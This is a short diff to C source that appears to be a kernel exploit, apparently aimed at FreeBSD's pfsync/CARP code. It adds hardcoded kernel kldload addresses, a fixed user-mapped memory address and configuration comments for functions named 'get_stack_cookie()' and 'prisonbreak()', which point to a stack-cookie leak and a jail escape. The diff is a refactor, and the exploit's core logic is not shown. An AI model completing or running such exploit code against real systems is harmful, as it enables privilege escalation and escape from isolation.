@@ -20,6 +20,7 @@
 
 #define u_32_t unsigned int
 
+// get_stack_cookie() configuration
 #define NUM_CARP_IFS 12
 #define IF_NAME "epair100b"
 
@@ -28,6 +29,8 @@
 
 #define DEBUG_KERN_KLDLOAD_ADDRESS 0xffffffff80af7af0
 #define PRODUCTION_KERN_KLDLOAD_ADDRESS 0xffffffff80b3db70
+// prisonbreak() configuration
+#define USER_MAPPED_MEMORY_ADDRESS 0x0000414141410000ULL
 
 typedef struct synchdr {
   u_32_t sm_magic; /* magic */
@@ -410,7 +413,7 @@ int map_memory() {
   size_t pages = 4;
   size_t len = 4096 * pages;
 
-  void* fixed = (void*)(uintptr_t)0x0000414141410000ULL;
+  void* fixed = (void*)(uintptr_t)USER_MAPPED_MEMORY_ADDRESS;
 
   int prot = PROT_READ | PROT_WRITE;
   int flags = MAP_PRIVATE | MAP_ANONYMOUS;
@@ -428,7 +431,7 @@ int map_memory() {
 }
 
 void dispatch_messages() {
-  void* fixed = (void*)(uintptr_t)0x0000414141410000ULL;
+  void* fixed = (void*)(uintptr_t)USER_MAPPED_MEMORY_ADDRESS;
   struct print_msg* msg = fixed;
 
   while (1) {
